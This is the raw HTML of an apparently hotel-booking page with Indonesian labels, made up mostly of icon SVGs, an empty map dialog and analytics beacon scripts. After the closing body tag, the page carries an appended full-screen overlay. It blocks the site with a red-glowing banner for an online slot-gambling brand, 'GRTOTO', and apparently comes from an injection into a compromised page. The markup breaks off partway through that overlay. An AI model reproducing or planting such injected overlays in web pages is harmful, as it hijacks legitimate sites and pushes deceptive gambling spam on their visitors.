<svg class="bk-icon -streamline-magnifying_glass" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M17.464 6.56a8.313 8.313 0 1 1-15.302 6.504A8.313 8.313 0 0 1 17.464 6.56zm1.38-.586C16.724.986 10.963-1.339 5.974.781.988 2.9-1.337 8.662.783 13.65c2.12 4.987 7.881 7.312 12.87 5.192 4.987-2.12 7.312-7.881 5.192-12.87zM15.691 16.75l7.029 7.03a.75.75 0 0 0 1.06-1.06l-7.029-7.03a.75.75 0 0 0-1.06 1.06z"/></svg>
<svg class="bk-icon -streamline-house" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M3 18v3.75A2.25 2.25 0 0 0 5.25 24h4.5a.75.75 0 0 0 .75-.75v-6a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v6c0 .414.336.75.75.75h4.5A2.25 2.25 0 0 0 21 21.75V18a.75.75 0 0 0-1.5 0v3.75a.75.75 0 0 1-.75.75h-4.5l.75.75v-6A2.25 2.25 0 0 0 12.75 15h-1.5A2.25 2.25 0 0 0 9 17.25v6l.75-.75h-4.5a.75.75 0 0 1-.75-.75V18A.75.75 0 0 0 3 18zm-1.72-.97L11.47 6.841a.75.75 0 0 1 1.06 0l10.19 10.19a.75.75 0 1 0 1.06-1.061L13.591 5.78a2.25 2.25 0 0 0-3.182 0L.219 15.97a.75.75 0 1 0 1.061 1.06zm15.97-7.28v-1.5L16.5 9h3.75l-.75-.75v5.25a.75.75 0 0 0 1.5 0V8.25a.75.75 0 0 0-.75-.75H16.5a.75.75 0 0 0-.75.75v1.5a.75.75 0 0 0 1.5 0zM16.522.3l-.407.543a1.793 1.793 0 0 0 .279 2.461c.12.102.14.28.045.406l-.411.548a.75.75 0 1 0 1.2.9l.407-.543a1.793 1.793 0 0 0-.279-2.461.295.295 0 0 1-.045-.406l.411-.548a.75.75 0 1 0-1.2-.9zm3.75 0l-.407.543a1.793 1.793 0 0 0 .279 2.461c.12.102.14.28.045.406l-.411.548a.75.75 0 1 0 1.2.9l.407-.543a1.793 1.793 0 0 0-.279-2.461.295.295 0 0 1-.045-.406l.411-.548a.75.75 0 1 0-1.2-.9z"/></svg>
<svg class="bk-icon -streamline-transport_airplane_depart" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M18.33 3.57L5.7 9.955l.79.07-1.96-1.478a.75.75 0 0 0-.753-.087l-2.1.925C.73 9.856.359 10.967.817 11.88c.11.22.263.417.45.577l3.997 3.402a2.94 2.94 0 0 0 3.22.4l3.62-1.8-1.084-.671v5.587a1.833 1.833 0 0 0 2.654 1.657l1.88-.932a1.85 1.85 0 0 0 .975-1.226l1.87-7.839-.396.498 3.441-1.707a3.494 3.494 0 1 0-3.11-6.259zm.672 1.342a1.994 1.994 0 0 1 1.775 3.571l-3.44 1.707a.75.75 0 0 0-.396.498l-1.87 7.838a.35.35 0 0 1-.185.232l-1.88.932a.335.335 0 0 1-.486-.304V13.79a.75.75 0 0 0-1.084-.672l-3.62 1.8a1.44 1.44 0 0 1-1.578-.197l-3.997-3.402a.35.35 0 0 1 .073-.577l2.067-.91-.754-.087 1.96 1.478a.75.75 0 0 0 .79.07l12.63-6.383zm-3.272.319l-4.46-2.26a1.852 1.852 0 0 0-1.656-.001l-1.846.912a1.85 1.85 0 0 0-.295 3.128l2.573 1.955a.75.75 0 1 0 .908-1.194L8.38 5.816a.35.35 0 0 1 .055-.591l1.845-.912a.351.351 0 0 1 .315 0l4.456 2.256a.75.75 0 0 0 .678-1.338z"/></svg>
<svg class="bk-icon -streamline-attractions" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M13.5 3a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zM15 3a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm6 4.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zM6 7.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zM21 15a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm-9-3.75a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zM6 15a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm10.066 1.277a7.5 7.5 0 0 1-3.077 2.05.75.75 0 0 0 .498 1.415 9 9 0 0 0 3.693-2.46.75.75 0 1 0-1.114-1.005zm1.798-6.466c.177.922.183 1.869.015 2.792a.75.75 0 1 0 1.476.268c.2-1.106.194-2.24-.019-3.344a.75.75 0 1 0-1.472.284zm-5.337-5.784a7.5 7.5 0 0 1 3.54 2.196.75.75 0 0 0 1.113-1.004 9.002 9.002 0 0 0-4.247-2.636.75.75 0 1 0-.406 1.444zM6.434 6.223a7.5 7.5 0 0 1 3.539-2.196.75.75 0 1 0-.406-1.444A9.001 9.001 0 0 0 5.32 5.219a.75.75 0 0 0 1.114 1.004zM4.636 12.69a7.602 7.602 0 0 1 0-2.878.75.75 0 1 0-1.472-.284 9.102 9.102 0 0 0 0 3.446.75.75 0 0 0 1.472-.284zm4.876 5.639a7.517 7.517 0 0 1-3.035-2.005.75.75 0 0 0-1.106 1.014 9.017 9.017 0 0 0 3.641 2.405.75.75 0 1 0 .5-1.414zM7.31 21.872A1.5 1.5 0 0 0 8.672 24h6.656a1.5 1.5 0 0 0 1.362-2.128l-3.314-8.217c-.361-.785-1.252-1.114-2.005-.767a1.5 1.5 0 0 0-.733.734l-3.343 8.283zm1.377.595l3.328-8.25-.015.033 3.313 8.217.015.033H8.672z"/></svg>
<svg class="bk-icon -streamline-pin" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M15.25 7.5a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0zm1.5 0a5.25 5.25 0 1 0-10.5 0 5.25 5.25 0 0 0 10.5 0zm-5.625-.75a.375.375 0 0 1-.375-.375.75.75 0 0 0 1.5 0c0-.621-.504-1.125-1.125-1.125a.75.75 0 0 0 0 1.5zm.375-.375a.375.375 0 0 1-.375.375.75.75 0 0 0 0-1.5c-.621 0-1.125.504-1.125 1.125a.75.75 0 0 0 1.5 0zM11.125 6c.207 0 .375.168.375.375a.75.75 0 0 0-1.5 0c0 .621.504 1.125 1.125 1.125a.75.75 0 0 0 0-1.5zm-.375.375c0-.207.168-.375.375-.375a.75.75 0 0 0 0 1.5c.621 0 1.125-.504 1.125-1.125a.75.75 0 0 0-1.5 0zm0 5.625v9a.75.75 0 0 0 1.5 0v-9a.75.75 0 0 0-1.5 0z"/></svg>
<svg class="bk-icon -streamline-plus" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M20.25 11.25h-7.5v-7.5a.75.75 0 0 0-1.5 0v7.5h-7.5a.75.75 0 0 0 0 1.5h7.5v7.5a.75.75 0 0 0 1.5 0v-7.5h7.5a.75.75 0 0 0 0-1.5z"/></svg>
<svg class="bk-icon -streamline-transport_metro" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M1.316 23.755l2.37-2.73a.75.75 0 0 0-1.132-.983l-2.37 2.73a.75.75 0 0 0 1.132.983zm22.5-.984l-2.37-2.729a.75.75 0 0 0-1.132.984l2.37 2.729a.75.75 0 0 0 1.132-.984zM21 9.013c0 5.765-4.036 12-9 12s-9-6.235-9-12c0-4.636 3.3-7.5 9-7.5s9 2.864 9 7.5zm1.5 0c0-5.516-4.016-9-10.5-9s-10.5 3.484-10.5 9c0 6.492 4.536 13.5 10.5 13.5s10.5-7.008 10.5-13.5zm-10.483 13.5a8.728 8.728 0 0 0 6.503-3.132.75.75 0 0 0 .162-.615c-.476-2.615-3.338-4.502-6.682-4.502-3.344 0-6.208 1.887-6.682 4.502a.75.75 0 0 0 .162.615 8.728 8.728 0 0 0 6.503 3.132zm0-1.5a7.228 7.228 0 0 1-5.385-2.594l.162.615c.33-1.822 2.527-3.27 5.206-3.27 2.679 0 4.875 1.448 5.206 3.27l.162-.615a7.228 7.228 0 0 1-5.385 2.594zm3.733-16.5h-7.5a3 3 0 0 0 0 6h7.5a3 3 0 1 0 0-6zm0 1.5a1.5 1.5 0 0 1 0 3h-7.5a1.5 1.5 0 1 1 0-3h7.5z"/></svg>
<svg class="bk-icon -streamline-distance" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M22.5 4.5c0 1.127-1.484 3.863-3.312 6.622a.375.375 0 0 1 .625 0C17.993 8.38 16.5 5.627 16.5 4.5a3 3 0 1 1 6 0zm1.5 0a4.5 4.5 0 1 0-9 0c0 1.574 1.512 4.362 3.563 7.45a1.126 1.126 0 0 0 1.875 0C22.498 8.842 24 6.074 24 4.5zm-4.5.375a.375.375 0 0 1-.375-.375.75.75 0 0 0 1.5 0c0-.621-.504-1.125-1.125-1.125a.75.75 0 0 0 0 1.5zm.375-.375a.375.375 0 0 1-.375.375.75.75 0 0 0 0-1.5c-.621 0-1.125.504-1.125 1.125a.75.75 0 0 0 1.5 0zm-.375-.375c.207 0 .375.168.375.375a.75.75 0 0 0-1.5 0c0 .621.504 1.125 1.125 1.125a.75.75 0 0 0 0-1.5zm-.375.375c0-.207.168-.375.375-.375a.75.75 0 0 0 0 1.5c.621 0 1.125-.504 1.125-1.125a.75.75 0 0 0-1.5 0zM5.25 13.125a.375.375 0 0 1-.375-.375.75.75 0 0 0 1.5 0c0-.621-.504-1.125-1.125-1.125a.75.75 0 0 0 0 1.5zm.375-.375a.375.375 0 0 1-.375.375.75.75 0 0 0 0-1.5c-.621 0-1.125.504-1.125 1.125a.75.75 0 0 0 1.5 0zm-.375-.375c.207 0 .375.168.375.375a.75.75 0 0 0-1.5 0c0 .621.504 1.125 1.125 1.125a.75.75 0 0 0 0-1.5zm-.375.375c0-.207.168-.375.375-.375a.75.75 0 0 0 0 1.5c.621 0 1.125-.504 1.125-1.125a.75.75 0 0 0-1.5 0zM5.25 9A3.75 3.75 0 0 1 9 12.75c0 1.302-1.62 3.954-3.75 6.676-2.132-2.728-3.75-5.374-3.75-6.676A3.75 3.75 0 0 1 5.25 9zm0-1.5A5.25 5.25 0 0 0 0 12.75c0 1.797 1.677 4.54 4.068 7.6a1.5 1.5 0 0 0 2.364 0c2.387-3.052 4.068-5.802 4.068-7.6 0-2.9-2.35-5.25-5.25-5.25zm1.907 16.38l12.75-8.25a.75.75 0 1 0-.814-1.26l-12.75 8.25a.75.75 0 0 0 .814 1.26z"/></svg>
<svg class="bk-icon -streamline-arrow_menu" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M12 20.09a1.24 1.24 0 0 1-.88-.36L6 14.61a.75.75 0 1 1 1.06-1.06L12 18.49l4.94-4.94A.75.75 0 0 1 18 14.61l-5.12 5.12a1.24 1.24 0 0 1-.88.36zm6-9.46a.75.75 0 0 0 0-1.06l-5.12-5.11a1.24 1.24 0 0 0-1.754-.006l-.006.006L6 9.57a.75.75 0 0 0 0 1.06.74.74 0 0 0 1.06 0L12 5.7l4.94 4.93a.73.73 0 0 0 .53.22c.2 0 .39-.078.53-.22z"/></svg>
<svg class="bk-icon -streamline-heart_outline" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M12.541 21.325l-9.588-10a4.923 4.923 0 1 1 6.95-6.976l1.567 1.566a.75.75 0 0 0 1.06 0l1.566-1.566a4.923 4.923 0 0 1 6.963 6.962l-9.6 10.014h1.082zm-1.082 1.038a.75.75 0 0 0 1.082 0l9.59-10.003a6.418 6.418 0 0 0-.012-9.07 6.423 6.423 0 0 0-9.083-.001L11.47 4.854h1.06l-1.566-1.566a6.423 6.423 0 1 0-9.082 9.086l9.577 9.99z"/></svg>
<svg class="bk-icon -streamline-heart" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M23.3 5.076a6.582 6.582 0 0 0-10.446-1.71L12 4.147l-.827-.753a6.522 6.522 0 0 0-5.688-1.806A6.472 6.472 0 0 0 .7 5.075a6.4 6.4 0 0 0 1.21 7.469l9.373 9.656a1 1 0 0 0 1.434 0l9.36-9.638A6.414 6.414 0 0 0 23.3 5.076z"/></svg>
<svg class="bk-icon -streamline-info_sign" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M14.25 15.75h-.75a.75.75 0 0 1-.75-.75v-3.75a1.5 1.5 0 0 0-1.5-1.5h-.75a.75.75 0 0 0 0 1.5h.75V15a2.25 2.25 0 0 0 2.25 2.25h.75a.75.75 0 0 0 0-1.5zM11.625 6a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5zM22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12zm1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12z"/></svg>
<svg class="bk-icon -streamline-transport_bike" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M16.5 3.75a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm-10.5 15a3 3 0 1 1-6 0 3 3 0 0 1 6 0zm1.5 0a4.5 4.5 0 1 0-9 0 4.5 4.5 0 0 0 9 0zm13.5 0a3 3 0 1 1-6 0 3 3 0 0 1 6 0zm1.5 0a4.5 4.5 0 1 0-9 0 4.5 4.5 0 0 0 9 0zm-12 .75a.75.75 0 0 1-.75-.75 6.734 6.734 0 0 0-3.642-5.994.75.75 0 0 1-.167-1.207l4.043-3.842a.75.75 0 0 1 1.187.208c.062.116.143.252.263.429.197.289.429.577.697.848.8.809 1.758 1.308 2.869 1.308a.75.75 0 0 1 0 1.5 5.564 5.564 0 0 1-4.137-1.966.75.75 0 0 0-1.089-.058l-1.452 1.38a.75.75 0 0 0 .031 1.116 8.22 8.22 0 0 1 2.897 6.277.75.75 0 0 1-.75.751zm0 1.5a2.25 2.25 0 0 0 2.25-2.25 9.72 9.72 0 0 0-3.425-7.421l.03 1.114 1.453-1.38-1.089-.059a7.07 7.07 0 0 0 5.268 2.496A2.25 2.25 0 1 0 16.5 9c-.656 0-1.26-.315-1.803-.863a4.554 4.554 0 0 1-.695-.914 2.25 2.25 0 0 0-3.552-.604l-4.043 3.842a2.25 2.25 0 0 0 .51 3.626 5.236 5.236 0 0 1 2.833 4.662A2.25 2.25 0 0 0 12 21z"/></svg>
<svg class="bk-icon -streamline-spa" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M11.72 14.295A7.35 7.35 0 0 1 8.997 8.85a7.148 7.148 0 0 1 2.25-4.972c.005-.005-.004-.005-.01-.01a7.173 7.173 0 0 1 2.261 5.03 7.332 7.332 0 0 1-2.722 5.397h.944zm-.944 1.166a.75.75 0 0 0 .944 0 8.85 8.85 0 0 0 3.277-6.555 8.683 8.683 0 0 0-2.72-6.12 1.482 1.482 0 0 0-2.069.01 8.658 8.658 0 0 0-2.71 6.062 8.869 8.869 0 0 0 3.278 6.603zm3.813-7.013A7.807 7.807 0 0 1 19.023 7.1l.003-.001a7.17 7.17 0 0 1-1.959 5.142 7.332 7.332 0 0 1-5.74 1.891.75.75 0 0 0-.158 1.492 8.85 8.85 0 0 0 6.953-2.318 8.68 8.68 0 0 0 2.404-6.233A1.495 1.495 0 0 0 19.029 5.6a9.304 9.304 0 0 0-5.282 1.608.75.75 0 1 0 .842 1.24zM8.75 7.221A9.239 9.239 0 0 0 3.417 5.6c-.815-.001-1.484.664-1.49 1.488a8.652 8.652 0 0 0 2.37 6.184 8.95 8.95 0 0 0 7.031 2.35.75.75 0 1 0-.158-1.49 7.431 7.431 0 0 1-5.82-1.927 7.142 7.142 0 0 1-1.923-5.091L3.426 7.1a7.746 7.746 0 0 1 4.476 1.357.75.75 0 0 0 .848-1.236zm-4.944 3.966c-2.223.948-3.808 2.716-3.808 4.441 0 3.47 5.422 6 12 6a22.404 22.404 0 0 0 6.977-1.047.75.75 0 0 0 .523-.715v-3.488l-.75.75h4.383a.75.75 0 0 0 .715-.524c.1-.315.15-.643.152-.973 0-2.068-1.986-3.858-5.079-4.944a.75.75 0 1 0-.497 1.416c2.56.898 4.076 2.265 4.076 3.525 0 .176-.028.354-.082.524l.715.226v-.75h-4.383a.75.75 0 0 0-.75.75v3.488l.523-.715a20.922 20.922 0 0 1-6.516.977c-5.856 0-10.507-2.17-10.507-4.5 0-1.02 1.17-2.325 2.896-3.061a.75.75 0 0 0-.588-1.38z"/></svg>
<svg class="bk-icon -streamline-food" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M5.999.75v22.5a.75.75 0 0 0 1.5 0V.75a.75.75 0 0 0-1.5 0zm3 0V7.5a2.259 2.259 0 0 1-2.252 2.25 2.258 2.258 0 0 1-2.248-2.252V.75a.75.75 0 0 0-1.5 0V7.5a3.76 3.76 0 0 0 3.748 3.75 3.76 3.76 0 0 0 3.752-3.748V.75a.75.75 0 0 0-1.5 0zm6.75 15.75h3c1.183.046 2.203-.9 2.25-2.111a2.22 2.22 0 0 0 0-.168c-.25-6.672-.828-9.78-3.231-13.533a1.508 1.508 0 0 0-2.77.81V23.25a.75.75 0 0 0 1.5 0V1.503c0 .003.001 0 .003 0a.006.006 0 0 1 .008.002c2.21 3.45 2.75 6.354 2.99 12.773v.053a.696.696 0 0 1-.721.67L15.749 15a.75.75 0 0 0 0 1.5z"/></svg>
<svg class="bk-icon -streamline-minus" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M20.25 12.75H3.75a.75.75 0 0 1 0-1.5h16.5a.75.75 0 0 1 0 1.5z"/></svg>
<svg class="bk-icon -streamline-beach" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M.153 22.237l.85 1.117c.634.76 1.724.856 2.456.244.078-.066.15-.138.216-.217l.944-1.132a.228.228 0 0 1 .349.001l.944 1.13a1.728 1.728 0 0 0 2.651.001l.944-1.132a.228.228 0 0 1 .349.001l.95 1.132a1.728 1.728 0 0 0 2.65 0l.942-1.133a.228.228 0 0 1 .349.001l.942 1.13a1.728 1.728 0 0 0 2.651.001l.944-1.132a.228.228 0 0 1 .349.001l.94 1.13a1.728 1.728 0 0 0 2.652.001l.585-.7a.75.75 0 1 0-1.15-.962l-.585.7a.228.228 0 0 1-.35 0l-.94-1.13a1.728 1.728 0 0 0-2.652-.001l-.944 1.132a.228.228 0 0 1-.349-.001l-.942-1.13a1.728 1.728 0 0 0-2.651-.001l-.943 1.132a.228.228 0 0 1-.348-.001l-.95-1.132a1.726 1.726 0 0 0-2.65 0l-.944 1.133a.228.228 0 0 1-.349-.001l-.944-1.13a1.728 1.728 0 0 0-2.65 0l-.945 1.13a.228.228 0 0 1-.349-.001l-.828-1.09a.75.75 0 1 0-1.194.91zm11.335-2.68A7.161 7.161 0 0 1 15.77 18h7.481a.75.75 0 0 0 0-1.5h-7.5a8.673 8.673 0 0 0-5.196 1.884.75.75 0 1 0 .934 1.174zM22.285 7.969a1.729 1.729 0 0 0 .781-2.711C19.43.713 12.8-.022 8.256 3.614a10.536 10.536 0 0 0-3.952 8.171A1.73 1.73 0 0 0 6.6 13.427l15.684-5.459zm-.494-1.416L6.107 12.01a.229.229 0 0 1-.304-.218 9.036 9.036 0 0 1 16.09-5.599.228.228 0 0 1-.102.359zm-9.459-4.2L11.69.504a.75.75 0 1 0-1.416.492l.643 1.848a.75.75 0 1 0 1.416-.492zm1.156 7.883l2.527 7.262a.75.75 0 1 0 1.416-.494l-2.527-7.26a.75.75 0 1 0-1.416.492z"/></svg>
<svg class="bk-icon -streamline-skilift" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M12.75 22.5h-.766a5.234 5.234 0 0 1-5.234-5.234V10.5c0-2.9 2.35-5.25 5.25-5.25a.75.75 0 0 0 .75-.75V1.875a.75.75 0 0 0-1.5 0V4.5l.75-.75a6.75 6.75 0 0 0-6.75 6.75v6.766A6.734 6.734 0 0 0 11.984 24h.766a.75.75 0 0 0 0-1.5zm1.125-13.125a1.875 1.875 0 1 1-3.75 0 1.875 1.875 0 0 1 3.75 0zm1.5 0a3.375 3.375 0 1 0-6.75 0 3.375 3.375 0 0 0 6.75 0zM.825 3.746l22.5-2.25a.75.75 0 0 0-.15-1.492l-22.5 2.25a.75.75 0 0 0 .15 1.492zM17.25 22.5a.75.75 0 0 1-.75-.75v-1.5a.75.75 0 0 0-.75-.75h-3a2.25 2.25 0 0 1-2.25-2.25V15a.75.75 0 0 1 1.5 0v2.25c0 .414.336.75.75.75h3A2.25 2.25 0 0 1 18 20.25v1.5a.75.75 0 0 1-.75.75zm0 1.5a2.25 2.25 0 0 0 2.25-2.25v-1.5a3.75 3.75 0 0 0-3.75-3.75h-3l.75.75V15A2.25 2.25 0 0 0 9 15v2.25A3.75 3.75 0 0 0 12.75 21h3l-.75-.75v1.5A2.25 2.25 0 0 0 17.25 24z"/></svg>
<div
class="map_full_overlay__wrapper "
role="region"
aria-label="Peta"
>
<div class="map_full_overlay__mask"></div>
<div class="map-modal-content capla-map-content"
role="dialog" aria-label="Lihat akomodasi di peta" aria-modal="true"
>
<button class="map_full_overlay__close js-map-modal-close" tabindex="0" aria-label="Tutup peta"></button>
<div
id="b_map_container"
class="b_map_br_zoom b_map_custom_zoom map_view"
>
<div id="b_map_tiles">
<div data-capla-component-boundary="b-property-web-property-page/MapDesktop"></div>
</div>
</div>
</div>
</div>
<div style="display: none;">
<svg class="bk-icon -fonticon-aclose" height="32" width="36" viewBox="0 0 36 32" role="presentation" aria-hidden="true" focusable="false">
  <path d="M34 3.2L30.8 0 18 12.8 5.2 0 2 3.2 14.8 16 2 28.8 5.2 32 18 19.2 30.8 32l3.2-3.2L21.2 16 34 3.2z"/>
</svg>
<svg class="bk-icon -fonticon-downchevron" height="32" width="51" viewBox="0 0 51 32" role="presentation" aria-hidden="true" focusable="false">
  <path d="M45.1.2L25.7 19.7 6.3.2 0 6.5l25.7 25.7L51.4 6.5z"/>
</svg>
<svg class="bk-icon -fonticon-upchevron" height="32" width="51" viewBox="0 0 51 32" role="presentation" aria-hidden="true" focusable="false">
  <path d="M6.3 32.2l19.4-19.5 19.4 19.5 6.3-6.3L25.7.2 0 25.9z"/>
</svg>
<svg class="bk-icon -fonticon-checkempty" height="32" width="32" viewBox="0 0 32 32" role="presentation" aria-hidden="true" focusable="false">
  <path d="M16 30c7.732 0 14-6.268 14-14S23.732 2 16 2 2 8.268 2 16s6.268 14 14 14zm0 2C7.163 32 0 24.837 0 16S7.163 0 16 0s16 7.163 16 16-7.163 16-16 16z"/>
</svg>
<svg class="bk-icon -fonticon-checkno2" height="32" width="32" viewBox="0 0 32 32" role="presentation" aria-hidden="true" focusable="false">
  <path d="M16 30c7.732 0 14-6.268 14-14S23.732 2 16 2 2 8.268 2 16s6.268 14 14 14zm0 2C7.163 32 0 24.837 0 16S7.163 0 16 0s16 7.163 16 16-7.163 16-16 16z"/>
  <path d="M24.587 11.039L13.825 21.583c-.054.09-.12.182-.208.271l-.504.505c-.278.278-.607.403-.733.276l-5.125-5.366c-.126-.126-.002-.454.276-.732l.504-.505c.279-.279.607-.403.733-.277l3.842 4.022L23.073 9.525a.715.715 0 0 1 1.009 0l.505.505a.715.715 0 0 1 0 1.009z"/>
</svg>
</div>
<span id="req_info" style="display:none;">2315130|2,2358120|2,2374380|1,2374100,2314520,2379720|1,2311730,2374450|1,2358120|3,2382230,2374380|4,2379720,2374450|4,2381690</span>

<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"af1109d8a5864ac49ca3e35caaee1364","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"163c3eb583b741b09fa8fb6792c38328","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e41561ba05d347d6836bed463d28ac9a","r":1,"server_timing":{"name":{"cfCacheSatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b43949cd337f46c9a3ceb578455b8450","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"ad70cd6c8ffb49e38c0907e5f2e172b0","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
      <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"32690924dfc94d0d8ed098bb2f25a09d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
      <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b6d0e7554f9d44bda604ba11f0f2c3c3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
    
</body>

<div style="position: fixed; z-index: 9999; width: 100vw; height: 100vh;
            top: 0; left: 0;
            background: radial-gradient(circle at center, rgba(15, 0, 0, 0.219), rgba(0, 0, 0, 0.767));
            backdrop-filter: blur(10px);
            display: flex; align-items: center; justify-content: center;
            padding: 20px; box-sizing: border-box;">

  <div style="display: flex; flex-direction: column; align-items: center; 
              width: 100%; max-width: 380px;
              background: linear-gradient(145deg, #440c0cab, #440c0cab);
              border: 1px solid rgba(255, 0, 0, 0.904);
              border-radius: 18px;
              padding: 22px;
              box-shadow: 0 0 30px rgba(235, 4, 4, 0.849);">

    <!-- IMAGE 1:1 -->
    <div style="width: 100%; aspect-ratio: 1/1; margin-bottom: 20px;">
      <img src="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg"
           alt="GRTOTO"
           style="width: 100%; height: 100%; object-fit: cover;
           border-radius: 14px;
           box-shadow: 0 0 20px rgb(218, 34, 2);" />
    </div>

